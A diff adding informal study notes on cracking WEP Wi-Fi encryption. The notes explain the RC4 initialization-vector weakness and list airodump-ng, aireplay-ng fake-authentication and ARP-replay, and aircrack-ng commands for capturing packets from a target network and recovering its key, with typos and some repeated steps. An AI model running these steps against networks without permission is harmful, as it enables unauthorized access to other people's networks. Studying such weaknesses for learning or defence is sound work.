@@ -1,0 +1,117 @@
+Network hacking and gaining access basic notes
+-Wired Equivalent Privacy
+old encryption
+use an algorithm called rc4 
+it would encrypt data using key 
+encrypted packet send in the air 
+router decrypts packet using the key
+problem how nit is implemented 
+wep cracking 
+wep generates key unique for each packet to do that generates random iv vector
+each packect in encrypted using a unique key stream
+random initialization vector used to generate key stream
+initialization vector 24 bit only 
+iv + key makes key stream
+keystream+"data to send"=encrypted data
+problem 
+iv to small
+iv sent in plain text
+results
+iv repeat on busy network
+this make wep vunerable
+repeated ivs can be used to determine key stream and break encryption
+tool aircrack-ng
+
+conclusion
+capture large num of packects --->> airodump-ng
+analyse capture iv and crack key --->> aircrack-ng
+
+if idle network wep then process complicated
+working on busy network
+
+process
+put adapter in monitor mode
+then run command 
+airodump-ng --bssid target network --channel 1 --write baqsic-wep wlan0
+
+data increasing very fast 
+under data column number of useful packets with diff iv 
+
+not in terminator other page split horizontally
+run command 
+ls
+aircrack-ng basic-wep01.cap 
+telling key found
+we can connect to network we got password
+some time no asci copy key found remove colons
+connect wityh this to net
+
+steps
+ifconfig wlan0 down
+iwconfig wlan0 mode monitor
+ifconfig wlan0 up
+##open two terminal 
+airodump-ng --band a wlan0 a show 5 giga hertz ##show networks
+airodump-ng --bssid target network --channel 1 --write baqsic-wep wlan0
+
+##second terminal
+ls
+aircrack-ng basic-wep01.cap 
+note
+airmong check kill process best to restart kali connect network
+
+WEP CRACKING NETWORK NOT BUSY ISSUE
+
+network not busy it will take a lot time to capture different iv 
+force ap to generate ivs
+problem
+aps only communicates with connected clients
+we cant comuinicate
+we cant start attack
+solution
+associate with ap before the attack
+
+steps 
+##open three terminal
+first 
+airodump-ng --band a wlan0 a show 5 giga hertz ##show networks
+airodump-ng --bssid target network --channel 1 --write arprelay wlan0
+auth open
+client show associated with network
+
+second
+aireplay-ng --fakeauth 0 -a bssid -h unspec wlan0
+enter 
+
+third 
+ifconfig 
+copy ether unspec
+
+above process you are associated 
+WEP CRACKING 
+ARP REQUEST REPLAY
+wait for arp packet 
+capture it and replay it send it
+this cause the ap to produce packect with new iv 
+keep doing until enough ivs 
+
+steps 
+##open three terminal
+first 
+airodump-ng --band a wlan0 a show 5 giga hertz ##show networks
+airodump-ng --bssid target network --channel 1 --write arprelay wlan0
+auth open
+client show associated with network
+
+second
+aireplay-ng --fakeauth 0 -a bssid -h unspec wlan0
+enter here first 
+aireplay-ng --fakeauth 0 -a bssid -h unspec wlan0
+aircrack-ng arprelay01.cap
+
+third 
+ifconfig 
+copy ether unspec
+clear
+aireplay-ng --arpreplay  -b bssid -h unspec wlan0
+enter here sec
